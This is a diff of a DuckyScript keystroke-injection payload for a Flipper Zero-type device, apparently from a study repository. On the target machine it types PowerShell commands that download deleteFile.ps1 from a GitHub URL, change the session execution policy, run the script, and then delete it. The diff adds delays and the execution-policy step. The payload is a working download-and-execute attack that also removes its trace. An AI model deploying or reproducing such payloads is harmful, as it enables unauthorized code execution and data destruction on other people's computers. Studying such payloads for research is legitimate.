@@ -14,21 +14,23 @@ SHIFT TAB
 DELAY 500
 ENTER
 DELAY 1500
-
 REM Downloading the deleteFile.ps1 from GitHub and running it
 STRING (New-Object System.Net.WebClient).DownloadFile('https://github.com/aenslei/flipperZero-studies/raw/main/Powershell/deleteFile.ps1', 'C:\deleteFile.ps1')
 ENTER
+DELAY 5000
 
-REM Running the deleteFile.ps1
+REM Changing Powershell ExecutionPolicy for current session and Running the deleteFile.ps1
 STRING cd C:\
+ENTER
+STRING pwsh.exe -ExecutionPolicy AllSigned
 ENTER
 STRING .\deleteFile.ps1
 ENTER
-DELAY 1000
 
 REM Deleting the deleteFile.ps1
 STRING Remove-Item -path deleteFile.ps1
 ENTER
+DELAY 5000
 
 REM Test Case
 STRING echo Script#6 Completed
